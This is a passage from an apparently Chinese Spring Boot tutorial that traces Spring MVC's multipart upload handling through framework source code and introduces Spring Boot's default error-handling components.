class="hljs-type">boolean</span> <span class="hljs-title function_">isMultipart</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br><span class="hljs-keyword">return</span> StringUtils.startsWithIgnoreCase(request.getContentType(), <span class="hljs-string">&quot;multipart/&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> MultipartHttpServletRequest <span class="hljs-title function_">resolveMultipart</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> MultipartException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardMultipartHttpServletRequest</span>(request, <span class="hljs-built_in">this</span>.resolveLazily);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cleanupMultipart</span><span class="hljs-params">(MultipartHttpServletRequest request)</span> &#123;<br><span class="hljs-keyword">if</span> (!(request <span class="hljs-keyword">instanceof</span> AbstractMultipartHttpServletRequest) ||<br>((AbstractMultipartHttpServletRequest) request).isResolved()) &#123;<br><span class="hljs-comment">// To be on the safe side: explicitly delete the parts,</span><br><span class="hljs-comment">// but only actual file parts (for Resin compatibility)</span><br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-keyword">for</span> (Part part : request.getParts()) &#123;<br><span class="hljs-keyword">if</span> (request.getFile(part.getName()) != <span class="hljs-literal">null</span>) &#123;<br>part.delete();<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">catch</span> (Throwable ex) &#123;<br>LogFactory.getLog(getClass()).warn(<span class="hljs-string">&quot;Failed to perform cleanup of multipart items&quot;</span>, ex);<br>&#125;<br>&#125;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FrameworkServlet</span> &#123;<br>    <br>    <span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">private</span> MultipartResolver multipartResolver;<br>    <br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initMultipartResolver</span><span class="hljs-params">(ApplicationContext context)</span> &#123;<br>...<br>        <br>        <span class="hljs-comment">//这个就是配置类配置的StandardServletMultipartResolver文件上传解析器</span><br><span class="hljs-built_in">this</span>.multipartResolver = context.getBean(MULTIPART_RESOLVER_BEAN_NAME, MultipartResolver.class);<br>...<br>&#125;<br>    <br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">processedRequest</span> <span class="hljs-operator">=</span> request;<br><span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">mappedHandler</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">multipartRequestParsed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<span class="hljs-comment">//最后finally的回收flag</span><br>...<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">Exception</span> <span class="hljs-variable">dispatchException</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//做预处理,如果有上传文件 就new StandardMultipartHttpServletRequest包装类</span><br>processedRequest = checkMultipart(request);<br>multipartRequestParsed = (processedRequest != request);<br><span class="hljs-comment">// Determine handler for the current request.</span><br>mappedHandler = getHandler(processedRequest);<br><br>                ...<br><br><span class="hljs-comment">// Determine handler adapter for the current request.</span><br><span class="hljs-type">HandlerAdapter</span> <span class="hljs-variable">ha</span> <span class="hljs-operator">=</span> getHandlerAdapter(mappedHandler.getHandler());<br><br>...<br><br><span class="hljs-comment">// Actually invoke the handler.</span><br>mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br>                <br>            &#125;<br>            ....<br>            <br><span class="hljs-keyword">finally</span> &#123;<br><br>            ...<br>            <br>            <span class="hljs-keyword">if</span> (multipartRequestParsed) &#123;<br>                cleanupMultipart(processedRequest);<br>            &#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">protected</span> HttpServletRequest <span class="hljs-title function_">checkMultipart</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> MultipartException &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.multipartResolver != <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-built_in">this</span>.multipartResolver.isMultipart(request)) &#123;<br>            ...<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.multipartResolver.resolveMultipart(request);<br>            ...<br>&#125;<br>    &#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cleanupMultipart</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.multipartResolver != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-type">MultipartHttpServletRequest</span> <span class="hljs-variable">multipartRequest</span> <span class="hljs-operator">=</span><br>WebUtils.getNativeRequest(request, MultipartHttpServletRequest.class);<br><span class="hljs-keyword">if</span> (multipartRequest != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-built_in">this</span>.multipartResolver.cleanupMultipart(multipartRequest);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</code>跳到以下的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestMappingHandlerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanFactoryAware</span>, InitializingBean &#123;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">handleInternal</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>ModelAndView mav;<br>...<br>mav = invokeHandlerMethod(request, response, handlerMethod);<br>        ...<br><span class="hljs-keyword">return</span> mav;<br>&#125;<br>    <br>    <span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">invokeHandlerMethod</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">ServletWebRequest</span> <span class="hljs-variable">webRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletWebRequest</span>(request, response);<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">WebDataBinderFactory</span> <span class="hljs-variable">binderFactory</span> <span class="hljs-operator">=</span> getDataBinderFactory(handlerMethod);<br><span class="hljs-type">ModelFactory</span> <span class="hljs-variable">modelFactory</span> <span class="hljs-operator">=</span> getModelFactory(handlerMethod, binderFactory);<br><br><span class="hljs-type">ServletInvocableHandlerMethod</span> <span class="hljs-variable">invocableMethod</span> <span class="hljs-operator">=</span> createInvocableHandlerMethod(handlerMethod);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.argumentResolvers != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//关注点</span><br>invocableMethod.setHandlerMethodArgumentResolvers(<span class="hljs-built_in">this</span>.argumentResolvers);<br>&#125;<br>...<br>invocableMethod.invokeAndHandle(webRequest, mavContainer);<br>...<br><br><span class="hljs-keyword">return</span> getModelAndView(mavContainer, modelFactory, webRequest);<br>&#125;<br><span class="hljs-keyword">finally</span> &#123;<br>webRequest.requestCompleted();<br>&#125;<br>&#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><code>this.argumentResolvers</code>其中主角类<code>RequestPartMethodArgumentResolver</code>用来生成</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletInvocableHandlerMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InvocableHandlerMethod</span> &#123;<br>    <br>    ...<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeAndHandle</span><span class="hljs-params">(ServletWebRequest webRequest, ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> invokeForRequest(webRequest, mavContainer, providedArgs);<br>...<br>&#125;<br>    <br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invokeForRequest</span><span class="hljs-params">(NativeWebRequest request, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>Object[] args = getMethodArgumentValues(request, mavContainer, providedArgs);<br>...<br><span class="hljs-keyword">return</span> doInvoke(args);<span class="hljs-comment">//反射调用</span><br>&#125;<br>    <br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">doInvoke</span><span class="hljs-params">(Object... args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> getBridgedMethod();<br>ReflectionUtils.makeAccessible(method);<br><span class="hljs-keyword">return</span> method.invoke(getBean(), args);<br>...<br>&#125;<br>    <br>    <span class="hljs-comment">//处理得出multipart参数，准备稍后的反射调用（@PostMapping标记的上传方法）</span><br>    <span class="hljs-keyword">protected</span> Object[] getMethodArgumentValues(NativeWebRequest request, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,<br>Object... providedArgs) <span class="hljs-keyword">throws</span> Exception &#123;<br><br>MethodParameter[] parameters = getMethodParameters();<br>...<br>Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[parameters.length];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; parameters.length; i++) &#123;<br><span class="hljs-type">MethodParameter</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> parameters[i];<br>parameter.initParameterNameDiscovery(<span class="hljs-built_in">this</span>.parameterNameDiscoverer);<br>args[i] = findProvidedArgument(parameter, providedArgs);<br><span class="hljs-keyword">if</span> (args[i] != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>            <span class="hljs-comment">//关注点1</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.resolvers.supportsParameter(parameter)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(formatArgumentError(parameter, <span class="hljs-string">&quot;No suitable resolver&quot;</span>));<br>&#125;<br><span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//关注点2</span><br>args[i] = <span class="hljs-built_in">this</span>.resolvers.resolveArgument(parameter, mavContainer, request, <span class="hljs-built_in">this</span>.dataBinderFactory);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>...<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> args;<br>&#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestPartMethodArgumentResolver</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMessageConverterMethodArgumentResolver</span> &#123;<br><br>    <span class="hljs-comment">//对应上面代码关注点1</span><br>    <span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsParameter</span><span class="hljs-params">(MethodParameter parameter)</span> &#123;<br>        <span class="hljs-comment">//标注@RequestPart的参数</span><br><span class="hljs-keyword">if</span> (parameter.hasParameterAnnotation(RequestPart.class)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (parameter.hasParameterAnnotation(RequestParam.class)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">return</span> MultipartResolutionDelegate.isMultipartArgument(parameter.nestedIfOptional());<br>&#125;<br>&#125;<br><br>    <span class="hljs-comment">//对应上面代码关注点2</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(MethodParameter parameter, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">NativeWebRequest request, <span class="hljs-meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> request.getNativeRequest(HttpServletRequest.class);<br>Assert.state(servletRequest != <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;No HttpServletRequest&quot;</span>);<br><br><span class="hljs-type">RequestPart</span> <span class="hljs-variable">requestPart</span> <span class="hljs-operator">=</span> parameter.getParameterAnnotation(RequestPart.class);<br><span class="hljs-type">boolean</span> <span class="hljs-variable">isRequired</span> <span class="hljs-operator">=</span> ((requestPart == <span class="hljs-literal">null</span> || requestPart.required()) &amp;&amp; !parameter.isOptional());<br><br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> getPartName(parameter, requestPart);<br>parameter = parameter.nestedIfOptional();<br><span class="hljs-type">Object</span> <span class="hljs-variable">arg</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-comment">//封装成MultipartFile类型的对象作参数</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">mpArg</span> <span class="hljs-operator">=</span> MultipartResolutionDelegate.resolveMultipartArgument(name, parameter, servletRequest);<br><span class="hljs-keyword">if</span> (mpArg != MultipartResolutionDelegate.UNRESOLVABLE) &#123;<br>arg = mpArg;<br>&#125;<br>        <br>        ...<br><br><span class="hljs-keyword">return</span> adaptArgumentIfNecessary(arg, parameter);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultipartResolutionDelegate</span> &#123;<br>    ...<br>    <br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">resolveMultipartArgument</span><span class="hljs-params">(String name, MethodParameter parameter, HttpServletRequest request)</span><br><span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">MultipartHttpServletRequest</span> <span class="hljs-variable">multipartRequest</span> <span class="hljs-operator">=</span><br>WebUtils.getNativeRequest(request, MultipartHttpServletRequest.class);<br><span class="hljs-type">boolean</span> <span class="hljs-variable">isMultipart</span> <span class="hljs-operator">=</span> (multipartRequest != <span class="hljs-literal">null</span> || isMultipartContent(request));<br><br><span class="hljs-keyword">if</span> (MultipartFile.class == parameter.getNestedParameterType()) &#123;<br><span class="hljs-keyword">if</span> (!isMultipart) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (multipartRequest == <span class="hljs-literal">null</span>) &#123;<br>multipartRequest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardMultipartHttpServletRequest</span>(request);<br>&#125;<br><span class="hljs-keyword">return</span> multipartRequest.getFile(name);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isMultipartFileCollection(parameter)) &#123;<br><span class="hljs-keyword">if</span> (!isMultipart) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (multipartRequest == <span class="hljs-literal">null</span>) &#123;<br>multipartRequest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardMultipartHttpServletRequest</span>(request);<br>&#125;<br>List&lt;MultipartFile&gt; files = multipartRequest.getFiles(name);<br><span class="hljs-keyword">return</span> (!files.isEmpty() ? files : <span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isMultipartFileArray(parameter)) &#123;<br><span class="hljs-keyword">if</span> (!isMultipart) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (multipartRequest == <span class="hljs-literal">null</span>) &#123;<br>multipartRequest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardMultipartHttpServletRequest</span>(request);<br>&#125;<br>List&lt;MultipartFile&gt; files = multipartRequest.getFiles(name);<br><span class="hljs-keyword">return</span> (!files.isEmpty() ? files.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MultipartFile</span>[<span class="hljs-number">0</span>]) : <span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Part.class == parameter.getNestedParameterType()) &#123;<br><span class="hljs-keyword">if</span> (!isMultipart) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><span class="hljs-keyword">return</span> request.getPart(name);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isPartCollection(parameter)) &#123;<br><span class="hljs-keyword">if</span> (!isMultipart) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br>List&lt;Part&gt; parts = resolvePartList(request, name);<br><span class="hljs-keyword">return</span> (!parts.isEmpty() ? parts : <span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isPartArray(parameter)) &#123;<br><span class="hljs-keyword">if</span> (!isMultipart) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br>List&lt;Part&gt; parts = resolvePartList(request, name);<br><span class="hljs-keyword">return</span> (!parts.isEmpty() ? parts.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Part</span>[<span class="hljs-number">0</span>]) : <span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> UNRESOLVABLE;<br>&#125;<br>&#125;<br>    <br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="52、错误处理-SpringBoot默认错误处理机制"><a href="#52、错误处理-SpringBoot默认错误处理机制" class="headerlink" title="52、错误处理-SpringBoot默认错误处理机制"></a>52、错误处理-SpringBoot默认错误处理机制</h2><p><a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#boot-features-error-handling">Spring Boot官方文档 - Error Handling</a></p><p><strong>默认规则</strong>：</p><ul><li><p>默认情况下，Spring Boot提供<code>/error</code>处理所有错误的映射</p></li><li><p>机器客户端，它将生成JSON响应，其中包含错误，HTTP状态和异常消息的详细信息。对于浏览器客户端，响应一个“ whitelabel”错误视图，以HTML格式呈现相同的数据</p></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;timestamp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2020-11-22T05:53:28.416+00:00&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">404</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Not Found&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;No message available&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/asadada&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><ul><li><p>要对其进行自定义，添加<code>View</code>解析为<code>error</code></p></li><li><p>要完全替换默认行为，可以实现 <code>ErrorController </code>并注册该类型的Bean定义，或添加<code>ErrorAttributes类型的组件</code>以使用现有机制但替换其内容。</p></li><li><p><code>/templates/error/</code>下的4xx，5xx页面会被自动解析</p></li></ul><h2 id="53、错误处理-【源码分析】底层组件功能分析"><a href="#53、错误处理-【源码分析】底层组件功能分析" class="headerlink" title="53、错误处理-【源码分析】底层组件功能分析"></a>53、错误处理-【源码分析】底层组件功能分析</h2><ul><li><code>ErrorMvcAutoConfiguration</code>  自动配置异常处理规则</li><li><strong>容器中的组件</strong>：类型：<code>DefaultErrorAttributes</code> -&gt; id：<code>errorAttributes</code></li><li><code>public class DefaultErrorAttributes implements ErrorAttributes, HandlerExceptionResolver</code><ul><li><code>DefaultErrorAttributes</code>：定义错误页面中可以包含数据（异常明细，堆栈信息等）。</li></ul></li><li><strong>容器中的组件</strong>：类型：<code>BasicErrorController</code> –&gt; id：<code>basicErrorController</code>（json+白页 适配响应）</li><li><strong>处理默认 <code>/error</code> 路径的请求</strong>，页面响应 <code>new ModelAndView(&quot;error&quot;, model);</code><ul><li>容器中有组件 <code>View</code>-&gt;id是error；（响应默认错误页）</li><li>容器中放组件 <code>BeanNameViewResolver</code>（视图解析器）；按照返回的视图名作为组件的id去容器中找<code>View</code>对象。</li></ul></li><li><strong>容器中的组件</strong>：类型：<code>DefaultErrorViewResolver</code> -&gt; id：<code>conventionErrorViewResolver</code></li><li><strong>如果发生异常错误，会以HTTP的状态码 作为视图页地址（viewName），找到真正的页面</strong>（主要作用）。<ul><li>error&#x2F;404、5xx.html</li><li>如果想要返回页面，就会找error视图（<code>StaticView</code>默认是一个白页）。</li></ul></li></ul><h2 id="54、错误处理-【源码流程】异常处理流程"><a href="#54、错误处理-【源码流程】异常处理流程" class="headerlink" title="54、错误处理-【源码流程】异常处理流程"></a>54、错误处理-【源码流程】异常处理流程</h2><p>譬如写一个会抛出异常的控制层：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 